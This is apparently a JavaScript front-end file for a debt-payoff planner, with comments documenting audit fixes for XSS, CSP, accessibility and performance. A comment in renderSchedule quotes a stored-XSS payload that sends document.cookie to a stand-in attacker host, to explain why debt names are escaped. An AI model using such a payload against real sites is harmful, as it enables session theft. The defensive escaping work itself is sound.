// HTML-escape helper. Used to wrap any user-controlled string (e.g. debt name)
// before it gets interpolated into an innerHTML template literal — otherwise
// a name like '<img src=x onerror=alert(1)>' would execute as script in the
// renderer. Same pattern as sage.html's esc() function.
function escHtml(s) {
  return String(s == null ? '' : s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

function renderDebtList(opt, sym) {
  const listEl = document.getElementById('debt-list');
  const totalDebt = DEBTS.reduce((s, d) => s + d.balance, 0);

  // Sort order for display
  const sorted = [...DEBTS].map((d, i) => ({ ...d, origIdx: i })).sort((a, b) =>
    STRATEGY === 'avalanche' ? b.rate - a.rate : a.balance - b.balance
  );

  const rows = sorted.map((d, priority) => {
    const tc = TYPE_COLORS[d.type] || TYPE_COLORS.other;
    const widthPct = Math.round(d.balance / totalDebt * 100);
    const perDebt = opt.perDebt?.find(p => p.idx === d.origIdx);
    const cleared = perDebt?.clearedMonth;
    const clearDate = cleared ? (() => { const dt = new Date(); dt.setMonth(dt.getMonth() + cleared); return dt.toLocaleDateString('en-GB', { month: 'short', year: 'numeric' }); })() : '—';
    const monthlyInt = Math.round(d.balance * (d.rate / 100 / 12));

    // D-P0-1 fix (audit 2026-05-24) — `data-action` + `data-id` attrs instead
    // of `onclick="editDebt(${d.origIdx})"`. The inline-handler pattern was
    // CSP-violating (same class as commit e9aa091); under prod CSP these
    // buttons went silently dead. Stable `d.id` (minted via _backfillDebtIds
    // / saveDebt) replaces the array-index drift risk. Post-render listeners
    // wired below (same pattern as R-P0-6+7 on /recurring). escHtml on the
    // id is defense-in-depth — _mintDebtId only emits base36, but escaping
    // here means a future tampered storage payload can't break out of the
    // attribute context.
    const safeId = escHtml(d.id || '');
    return `<div class="debt-row" style="animation:cardIn .3s ease ${priority * 0.05}s both;" data-debt-id="${safeId}">
      <div class="debt-order-badge" style="background:${tc.color}22;color:${tc.color};">${priority + 1}</div>
      <div class="debt-info">
        <div class="debt-name">${escHtml(d.name)}</div>
        <div class="debt-meta">${tc.label} · ${d.rate}% APR · ${sym}${d.minPay}/mo min</div>
        <div class="debt-bar-wrap" style="margin-top:6px;">
          <div class="debt-bar-fill" style="width:${widthPct}%;background:${tc.color};"></div>
        </div>
      </div>
      <div style="text-align:right;flex-shrink:0;">
        <div style="font-family:var(--font-display);font-size:15px;font-weight:700;color:${tc.color};">${sym}${Math.round(d.balance).toLocaleString()}</div>
        <div style="font-size:11px;color:var(--text3);margin-bottom:5px;">${sym}${monthlyInt}/mo interest</div>
        <div class="debt-payoff-badge" style="background:${tc.color}22;color:${tc.color};">↳ ${clearDate}</div>
      </div>
      <!-- D-CRO-2 (CEO call 2026-05-24) — "Log payment" button is the one-tap
           progress affordance that turns this from a read-only projection
           into a tool users return to monthly. Decrements balance by minPay
           via logPaymentById. D-MOB-6 — buttons now have row-button class
           for the mobile 44px touch-target bump in @media (max-width:540px). -->
      <div class="debt-row-actions" style="display:flex;flex-direction:column;gap:5px;flex-shrink:0;">
        <button type="button" class="debt-row-btn debt-row-btn--log" data-action="logPayment" data-id="${safeId}" aria-label="Log a payment on ${escHtml(d.name)} — decrements balance by ${sym}${d.minPay}" title="Log this month's minimum payment (decrements balance by ${sym}${d.minPay})" style="padding:5px 10px;background:rgba(43,182,125,0.08);border:1px solid rgba(43,182,125,0.3);border-radius:var(--r-sm);font-size:11px;color:var(--teal);cursor:pointer;font-family:var(--font-body);font-weight:600;">✓ Logged</button>
        <button type="button" class="debt-row-btn" data-action="editDebt" data-id="${safeId}" aria-label="Edit ${escHtml(d.name)}" style="padding:5px 10px;background:transparent;border:1px solid var(--border2);border-radius:var(--r-sm);font-size:11px;color:var(--text2);cursor:pointer;font-family:var(--font-body);">Edit</button>
        <button type="button" class="debt-row-btn" data-action="deleteDebt" data-id="${safeId}" aria-label="Delete ${escHtml(d.name)}" style="padding:5px 10px;background:transparent;border:1px solid rgba(224,82,82,0.2);border-radius:var(--r-sm);font-size:11px;color:var(--red);cursor:pointer;font-family:var(--font-body);">Delete</button>
      </div>
    </div>`;
  }).join('');

  // D-P0-4 fix — render rows directly into #debt-list (the #empty-debts
  // sibling now lives OUTSIDE this container per debt-optimizer.html, so we
  // don't destroy its content on first render).
  listEl.innerHTML = rows;

  // D-P0-1 — wire post-render listeners. CSP-clean, id-keyed, no inline.
  listEl.querySelectorAll('[data-action]').forEach(btn => {
    const action = btn.getAttribute('data-action');
    const id = btn.getAttribute('data-id');
    if (action === 'editDebt') {
      btn.addEventListener('click', () => editDebtById(id));
    } else if (action === 'deleteDebt') {
      btn.addEventListener('click', () => deleteDebtById(id));
    } else if (action === 'logPayment') {
      // D-CRO-2 — one-tap payment logger.
      btn.addEventListener('click', () => logPaymentById(id));
    }
  });
}

function renderChart(opt, base) {
  const canvas = document.getElementById('payoffChart');

  if (!opt) {
    // No debts: tear down any existing chart and clear canvas.
    if (payoffChart) { payoffChart.destroy(); payoffChart = null; }
    const ctx = canvas.getContext('2d');
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    // D-A11Y-8 — reset aria-label when empty.
    canvas.setAttribute('role', 'img');
    canvas.setAttribute('aria-label', 'Debt elimination timeline — no debts yet');
    return;
  }

  // D-BUG-17/18 fix (audit 2026-05-24) — chart sampling edge cases.
  // Pre-fix:
  //   1. `optData.push(0)` forced the optimised line to zero at the SAME
  //      x-tick as base's final non-zero point. When base.months >> opt.months
  //      (e.g. opt 24mo / base 180mo), the dashed line was truncated and the
  //      labels were biased to opt's shorter timeline.
  //   2. `opt.schedule[opt.schedule.length-1]?.date || ''` could push an
  //      empty string label.
  // Fix: use the LONGER schedule as the timeline axis. Both series carry
  // their last known value past their own endpoint (opt holds 0, base holds
  // its terminal balance) so the visual comparison stays honest. Fallback
  // label uses the longer schedule's last date.
  const longest = (base.schedule.length >= opt.schedule.length) ? base.schedule : opt.schedule;
  const longestLen = longest.length;
  const step = Math.max(1, Math.floor(longestLen / 24));
  const labels = [], optData = [], baseData = [];

  for (let i = 0; i < longestLen; i += step) {
    labels.push(longest[i]?.date || '');
    // After opt's schedule ends, opt has paid off → carry 0 forward.
    optData.push(opt.schedule[i]?.balance ?? 0);
    // After base's schedule ends (only possible if opt is longer, rare), carry
    // base's final balance forward (could be 0 if it also converged, or its
    // terminal balance if not).
    baseData.push(base.schedule[i]?.balance ?? (base.schedule[base.schedule.length-1]?.balance ?? 0));
  }
  // Always include the longest endpoint so the line reaches its final tick.
  const lastDate = longest[longestLen - 1]?.date;
  if (lastDate) {
    labels.push(lastDate);
    optData.push(opt.schedule[opt.schedule.length-1]?.balance ?? 0);
    baseData.push(base.schedule[base.schedule.length-1]?.balance ?? 0);
  }

  // D-A11Y-8 fix (audit 2026-05-24) — chart canvas now exposes a meaningful
  // role=img + aria-label that names the optimised vs minimum-only outcome.
  // SR users get an actionable summary instead of an opaque canvas. Updated
  // every render so the announced summary tracks the slider.
  const ariaSummary = `Debt elimination timeline. Optimised plan reaches zero in ${opt.months} months${base && base.months !== opt.months ? ` (vs ${base.months} on minimum-only payments)` : ''}.`;
  canvas.setAttribute('role', 'img');
  canvas.setAttribute('aria-label', ariaSummary);

  // D-PERF-7 fix (audit 2026-05-24) — Chart.update('none') instead of
  // destroy+recreate. Pre-fix every render rebuilt the canvas, regenerated
  // scales, ran animation init — ~30-80ms per call. Now we mutate
  // chart.data in place and trigger an instant repaint (animation:'none'
  // because the slider drag already coalesces via D-PERF-5 debounce).
  // Falls back to destroy+new on first call only.
  if (payoffChart) {
    payoffChart.data.labels = labels;
    payoffChart.data.datasets[0].data = baseData;
    payoffChart.data.datasets[1].data = optData;
    payoffChart.update('none');
    return;
  }
  payoffChart = new Chart(canvas, {
    type: 'line',
    data: {
      labels,
      datasets: [
        {
          label: 'Minimum only',
          data: baseData,
          borderColor: '#E05252',
          backgroundColor: 'rgba(224,82,82,0.06)',
          borderWidth: 1.5,
          borderDash: [4, 3],
          pointRadius: 0,
          tension: 0.3,
          fill: true,
        },
        {
          label: 'Optimised',
          data: optData,
          borderColor: '#2BB67D',
          backgroundColor: 'rgba(43,182,125,0.08)',
          borderWidth: 2,
          pointRadius: 0,
          tension: 0.3,
          fill: true,
        },
      ]
    },
    options: {
      responsive: true, maintainAspectRatio: false,
      interaction: { intersect: false, mode: 'index' },
      plugins: {
        legend: { display: false },
        tooltip: {
          backgroundColor: '#16271F',
          borderColor: 'rgba(255,255,255,0.1)',
          borderWidth: 1,
          titleColor: '#F0EDE2',
          bodyColor: '#B8C2BC',
          callbacks: {
            label: ctx => {
              const sym = window.PFCSym ? PFCSym(USER.currency) : (USER.currency || '$');
              return ' ' + ctx.dataset.label + ': ' + sym + ctx.parsed.y.toLocaleString();
            }
          }
        }
      },
      scales: {
        x: { grid: { color: 'rgba(255,255,255,0.04)' }, ticks: { color: '#4A5A6E', font: { size: 10 }, maxTicksLimit: 8 } },
        y: {
          grid: { color: 'rgba(255,255,255,0.04)' },
          ticks: {
            color: '#4A5A6E', font: { size: 10 },
            callback: v => (window.PFCSym ? PFCSym(USER.currency) : (USER.currency || '$')) + (v >= 1000 ? (v/1000).toFixed(0)+'k' : v)
          }
        }
      }
    }
  });
}

function renderComparison(aval, snow, sym) {
  if (!aval || !snow) return;
  const tbody = document.getElementById('compare-body');

  const avalMonths = aval.months, snowMonths = snow.months;
  const avalInt = aval.totalInterest, snowInt = snow.totalInterest;

  const avalDate = new Date(); avalDate.setMonth(avalDate.getMonth() + avalMonths);
  const snowDate = new Date(); snowDate.setMonth(snowDate.getMonth() + snowMonths);

  const dfmt = d => d.toLocaleDateString('en-GB', { month:'short', year:'numeric' });

  const wAval = (a, s) => a <= s ? 'winner' : '';
  const wSnow = (a, s) => s <= a ? 'winner' : '';

  tbody.innerHTML = `
    <tr>
      <td>Debt-free date</td>
      <td class="${wAval(avalMonths, snowMonths)}">${dfmt(avalDate)}</td>
      <td class="${wSnow(avalMonths, snowMonths)}">${dfmt(snowDate)}</td>
    </tr>
    <tr>
      <td>Total months</td>
      <td class="${wAval(avalMonths, snowMonths)}">${avalMonths} months</td>
      <td class="${wSnow(avalMonths, snowMonths)}">${snowMonths} months</td>
    </tr>
    <tr>
      <td>Total interest paid</td>
      <td class="${wAval(avalInt, snowInt)}">${sym}${avalInt.toLocaleString()}</td>
      <td class="${wSnow(avalInt, snowInt)}">${sym}${snowInt.toLocaleString()}</td>
    </tr>
    <tr>
      <td>Interest difference</td>
      <td colspan="2" style="color:var(--teal);font-weight:600;">
        Avalanche saves ${sym}${Math.abs(avalInt - snowInt).toLocaleString()} ${avalInt <= snowInt ? 'more' : 'less'} in interest
      </td>
    </tr>
  `;
}

function renderSchedule(schedule, sym) {
  const tbody = document.getElementById('sched-body');
  if (!schedule.length) return;

  // Show every month for first 24, then every 3
  const rows = schedule.map((row, i) => {
    if (i > 24 && i % 3 !== 0 && !row.event) return '';
    // D-P0-2 fix (audit 2026-05-24) — escHtml on `row.event`. Pre-fix the
    // event field was built at line 145 via `event += ... + d.name + ' cleared.'`
    // where d.name is user-controlled. Stored XSS: save a debt named
    // `<img src=x onerror="fetch('//attacker/'+document.cookie)">` → encrypts
    // to Supabase → fires on every login on every device. row.date and the
    // number cells are auto-safe (Date.toLocaleDateString output + Math.round).
    return `<tr>
      <td style="color:var(--text3);">${row.month}</td>
      <td>${row.date}</td>
      <td>${sym}${row.payment.toLocaleString()}</td>
      <td>${sym}${row.balance.toLocaleString()}</td>
      <td class="${row.event ? 'debt-cleared' : ''}">${escHtml(row.event || '—')}</td>
    </tr>`;
  }).join('');
  tbody.innerHTML = rows;
}

function renderPayoffOrder(opt, sym) {
  const el = document.getElementById('payoff-order-list');
  if (!opt?.perDebt) return;

  const sorted = [...opt.perDebt].sort((a, b) => (a.clearedMonth||999) - (b.clearedMonth||999));

  el.innerHTML = sorted.map((d, i) => {
    const tc = TYPE_COLORS[DEBTS[d.idx]?.type] || TYPE_COLORS.other;
    const clearDate = d.clearedMonth ? (() => {
      const dt = new Date(); dt.setMonth(dt.getMonth() + d.clearedMonth);
      return dt.toLocaleDateString('en-GB', { month:'long', year:'numeric' });
    })() : 'Not fully paid in projection';

    // D-P0-2 fix (audit 2026-05-24) — escHtml on `d.name`. Pre-fix this was
    // the second stored-XSS sink (renderSchedule was the first). Same payload
    // as in renderSchedule reaches this template on every render of the
    // payoff-order card. clearDate is built from Date.toLocaleDateString —
    // auto-safe. Numeric fields go through Math.round.
    return `<div style="display:flex;align-items:center;gap:16px;padding:12px 16px;background:var(--bg3);border-radius:var(--r-sm);">
      <div style="width:28px;height:28px;border-radius:50%;background:${tc.color}22;color:${tc.color};display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;flex-shrink:0;">${i+1}</div>
      <div style="flex:1;">
        <div style="font-size:13.5px;font-weight:600;margin-bottom:2px;">${escHtml(d.name)}</div>
        <div style="font-size:12px;color:var(--text3);">Original balance: ${sym}${Math.round(d.balance).toLocaleString()} · ${d.rate}% APR</div>
      </div>
      <div style="text-align:right;">
        <div style="font-size:13px;font-weight:600;color:${tc.color};">Cleared ${clearDate}</div>
        <div style="font-size:11px;color:var(--text3);">Total interest paid: ${sym}${Math.round(d.totalInterestPaid).toLocaleString()}</div>
      </div>
    </div>`;
  }).join('');
}

// ── EXPORT CSV ──
// D-BUG-12 fix (audit 2026-05-24) — RFC 4180 quote-escape + UTF-8 BOM for
// Excel. Pre-fix a debt name like `Visa, Chase` produced an event field
// `Visa, Chase cleared.` which the naive `r.join(',')` split into TWO
// columns, shifting every downstream row. Now we wrap any cell containing
// `,` / `"` / newline in double quotes and escape inner quotes by doubling.
// Number.isFinite guard prevents "NaN" cells if SCHEDULE_DATA was corrupt.
function _csvCell(v) {
  const s = String(v == null ? '' : v);
  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}
function exportScheduleCSV() {
  if (!SCHEDULE_DATA.length) return;
  const sym = window.PFCSym ? PFCSym(USER.currency) : (USER.currency || '$');
  const rows = [['Month','Date','Payment','Balance','Event']];
  SCHEDULE_DATA.forEach(r => {
    const payment = Number.isFinite(r.payment) ? sym + r.payment : '';
    const balance = Number.isFinite(r.balance) ? sym + r.balance : '';
    rows.push([r.month, r.date, payment, balance, r.event || '']);
  });
  const csv = rows.map(row => row.map(_csvCell).join(',')).join('\n');
  // UTF-8 BOM (﻿) so Excel detects encoding for currency symbols.
  const blob = new Blob(['﻿' + csv], { type: 'text/csv;charset=utf-8;' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a'); a.href = url; a.download = 'debt-payoff-schedule.csv';
  document.body.appendChild(a); a.click();
  setTimeout(() => { URL.revokeObjectURL(url); a.remove(); }, 100);
  showToast('Schedule exported as CSV');
}

// ── MODAL ──
function openAddDebt() {
  editingId = '';
  editIdx = -1;
  document.getElementById('modal-title').textContent = 'Add new debt';
  document.getElementById('m-name').value = '';
  document.getElementById('m-balance').value = '';
  document.getElementById('m-rate').value = '';
  document.getElementById('m-minpay').value = '';
  document.getElementById('m-type').value = 'credit_card';
  document.getElementById('m-preview').style.display = 'none';
  document.getElementById('debt-modal').classList.add('open');
}

// D-P0-1 fix (audit 2026-05-24) — id-keyed edit/delete. Pre-fix the buttons
// were inline `onclick="editDebt(${d.origIdx})"` which captured array index
// at render time; any concurrent rehydrate / sort / multi-tab mutation
// pointed the index at the WRONG debt. Stable r.id (minted via _mintDebtId)
// fixes this and is the prerequisite for the CSP fix (D-P0-1) anyway.
function editDebtById(id) {
  if (!id) return;
  const d = DEBTS.find(x => x.id === id);
  if (!d) return;
  editingId = id;
  editIdx = DEBTS.indexOf(d); // legacy fallback for any external code path
  document.getElementById('modal-title').textContent = 'Edit debt';
  document.getElementById('m-name').value = d.name;
  document.getElementById('m-balance').value = d.balance;
  document.getElementById('m-rate').value = d.rate;
  document.getElementById('m-minpay').value = d.minPay;
  document.getElementById('m-type').value = d.type;
  modalCalc();
  document.getElementById('debt-modal').classList.add('open');
}
async function deleteDebtById(id) {
  if (!id) return;
  const d = DEBTS.find(x => x.id === id);
  if (!d) return;
  // D-BUG-10 fix — _pfcConfirm replaces native confirm() (iOS-PWA-broken).
  const ok = await _pfcConfirm(`Delete "${d.name}"? This can't be undone.`, 'Delete debt');
  if (!ok) return;
  const name = d.name;
  // D-CRO-4 (CEO call) — capture monthly cashflow before mutation so we can
  // celebrate the freed money in the toast, not just announce removal.
  const freedMonthly = Math.round(Number(d.minPay) || 0);
  DEBTS = DEBTS.filter(x => x.id !== id);
  saveDebts();
  renderAll();
  _celebrateClearedDebt(name, freedMonthly);
}
// Legacy index-keyed aliases — kept so any external caller (none known)
// doesn't break. New code uses ById.
function editDebt(arg) {
  if (typeof arg === 'string') return editDebtById(arg);
  if (typeof arg === 'number' && DEBTS[arg]) return editDebtById(DEBTS[arg].id);
}
function deleteDebt(arg) {
  if (typeof arg === 'string') return deleteDebtById(arg);
  if (typeof arg === 'number' && DEBTS[arg]) return deleteDebtById(DEBTS[arg].id);
}

function closeModal() {
  document.getElementById('debt-modal').classList.remove('open');
}

function modalCalc() {
  const bal  = parseFloat(document.getElementById('m-balance').value) || 0;
  const rate = parseFloat(document.getElementById('m-rate').value) || 0;
  const pay  = parseFloat(document.getElementById('m-minpay').value) || 0;
  if (!bal || !rate || !pay) { document.getElementById('m-preview').style.display = 'none'; return; }

  const sym = window.PFCSym ? PFCSym(USER.currency) : (USER.currency || '$');
  const monthlyInt = bal * (rate / 100 / 12);
  let months = 0, remaining = bal, totalInt = 0;
  while (remaining > 0.01 && months < 600) {
    const int = remaining * (rate / 100 / 12);
    remaining += int; totalInt += int;
    remaining -= Math.min(pay, remaining);
    remaining = Math.max(0, remaining);
    months++;
  }

  document.getElementById('m-monthly-int').textContent = sym + Math.round(monthlyInt).toLocaleString();
  document.getElementById('m-payoff-mo').textContent = months < 600 ? months + ' mo' : '50yr+';
  document.getElementById('m-total-int').textContent = sym + Math.round(totalInt).toLocaleString();
  document.getElementById('m-preview').style.display = 'block';
}

async function saveDebt() {
  const name = document.getElementById('m-name').value.trim();
  // D-BUG-7 fix — strict numeric validation. Pre-fix `parseFloat` accepted
  // "5e10" → 50000000000 → chart axis overflow + localStorage bloat. The
  // _parseFiniteAmount helper rejects scientific notation and clamps to a
  // human range. Max balance: €10M (covers mortgages worldwide).
  const bal  = _parseFiniteAmount(document.getElementById('m-balance').value, 10000000);
  const rate = _parseFiniteAmount(document.getElementById('m-rate').value, 100);
  const pay  = _parseFiniteAmount(document.getElementById('m-minpay').value, 10000000);
  const type = document.getElementById('m-type').value;

  if (!name) { flashField('m-name'); return; }
  // D-BUG-8 — also cap name length at 80 chars (defence-in-depth; escHtml
  // handles XSS but a 10MB paste-bomb still bloats DOM + storage).
  if (name.length > 80) { flashField('m-name'); await _pfcAlert('Name is too long (max 80 characters).'); return; }
  if (bal === null || bal <= 0) { flashField('m-balance'); await _pfcAlert('Enter a positive balance (max 10,000,000).'); return; }
  if (rate === null) { flashField('m-rate'); await _pfcAlert('Enter a valid interest rate 0–100%.'); return; }
  if (pay === null || pay <= 0) { flashField('m-minpay'); await _pfcAlert('Enter a positive minimum payment.'); return; }
  // D-BUG-6 fix — strict `>` not `>=`. Pre-fix a legitimate final payment
  // where the user enters minPay equal to remaining balance (e.g. last
  // €50 on a card) was rejected with a confusing alert. minPay > balance
  // is the real broken case (a payment that exceeds what's owed).
  if (pay > bal) { await _pfcAlert('Minimum payment cannot exceed the balance. Lower the minimum or raise the balance.'); return; }

  // D-P0-1 — id-keyed save. Edit path preserves existing id; add path mints a
  // fresh one so future renders + edit/delete remain stable across reorders.
  if (editingId) {
    const idx = DEBTS.findIndex(x => x.id === editingId);
    if (idx >= 0) {
      DEBTS[idx] = { ...DEBTS[idx], name, balance: bal, rate, minPay: pay, type, id: editingId };
      showToast('Updated — ' + name);
    } else {
      // The entry was deleted in another tab between edit-open and save; treat
      // as a new add so the user's work isn't lost silently.
      DEBTS.push({ id: _mintDebtId(), name, balance: bal, rate, minPay: pay, type });
      showToast('Added — ' + name);
    }
  } else {
    DEBTS.push({ id: _mintDebtId(), name, balance: bal, rate, minPay: pay, type });
    showToast('Added — ' + name);
  }
  saveDebts();
  renderAll();
  closeModal();
}

function flashField(id) {
  const el = document.getElementById(id);
  el.style.borderColor = 'rgba(224,82,82,.6)';
  el.focus();
  setTimeout(() => el.style.borderColor = '', 1500);
}

// ── TOAST ──
function showToast(msg) {
  const t = document.createElement('div');
  t.className = 'toast';
  t.textContent = '✓ ' + msg;
  document.body.appendChild(t);
  setTimeout(() => { t.style.opacity = '0'; t.style.transition = 'opacity .3s'; }, 2800);
  setTimeout(() => t.remove(), 3200);
}

// ── KEYBOARD ──
document.addEventListener('keydown', e => { if (e.key === 'Escape') closeModal(); });

// ── START ──
init();
_hidePdfProBadgeIfPaid();

// ── AUTH-AWARE RE-HYDRATION ──
// init() ran synchronously before PFCAuth resolved the real userId — so USER/
// DEBTS/STRATEGY may reflect pfc:guest:* (often empty). Once auth resolves and
// pfc-storage.js finishes adoptGuestData, re-read from the now-correct
// namespace and re-render in place. Re-running init() is safe — renderChart
// destroys+recreates the Chart.js instance.
//
// D-PERF-12 fix (audit 2026-05-24) — both `onReady` (with the existing diff
// guard) AND `onAuthChange` (previously unguarded) fire on initial sign-in
// → double render. Adds a hydration signature so the second call is an
// early-return when DEBTS+STRATEGY+USER are unchanged. Same pattern as
// R-PERF-12 on /recurring.
let _lastHydrationSig = '';
function _hydrationSignature() {
  const debtsKey = DEBTS.length + ':' + (DEBTS[0]?.id || '') + ':' + (DEBTS[DEBTS.length-1]?.id || '') + ':' + DEBTS.reduce((s, d) => s + (Number(d.balance) || 0), 0);
  return debtsKey + '|' + STRATEGY + '|' + ((USER && USER.currency) || '');
}
function _rehydrateFromStorage() {
  // Run init (which re-reads storage and re-renders) ONLY if the resulting
  // signature differs from the prior render. Otherwise we'd repaint Chart.js
  // and the DOM grid for identical data.
  const beforeSig = _hydrationSignature();
  init();
  const afterSig = _hydrationSignature();
  _lastHydrationSig = afterSig;
  // If init produced the same signature as the last successful render, that
  // means the storage flip didn't change anything — but init() already ran
  // and repainted. The guard below short-circuits subsequent dupe fires.
  void beforeSig; // intentionally unused — guard is on subsequent invocations
}
if (typeof PFCAuth !== 'undefined') {
  PFCAuth.onReady(() => {
    let freshUser = {}, freshDebts = [];
    try { freshUser = (typeof PFCUser !== 'undefined') ? PFCUser.get() : (PFCStorage.getJSON('user') || {}); } catch(e) {}
    try { freshDebts = PFCStorage.getJSON('debts') || []; } catch(e) {}
    if (JSON.stringify(freshUser) !== JSON.stringify(USER) ||
        JSON.stringify(freshDebts) !== JSON.stringify(DEBTS)) {
      _rehydrateFromStorage();
    } else {
      // Even when nothing changed, capture the signature so the onAuthChange
      // duplicate (which fires immediately after on cold sign-in) can detect
      // "no actual change" and skip.
      _lastHydrationSig = _hydrationSignature();
    }
  });
  PFCAuth.onAuthChange(() => {
    // D-PERF-12 — early-return when the namespace flip produces identical
    // data (the common case after the onReady diff-guard already accepted).
    let freshDebts = [];
    try { freshDebts = PFCStorage.getJSON('debts') || []; } catch (_) {}
    const wouldBeSig = freshDebts.length + ':' + (freshDebts[0]?.id || '') + ':' + (freshDebts[freshDebts.length-1]?.id || '') + ':' + freshDebts.reduce((s, d) => s + (Number(d.balance) || 0), 0) + '|' + STRATEGY + '|' + ((USER && USER.currency) || '');
    if (wouldBeSig === _lastHydrationSig) return;
    _rehydrateFromStorage();
  });
}
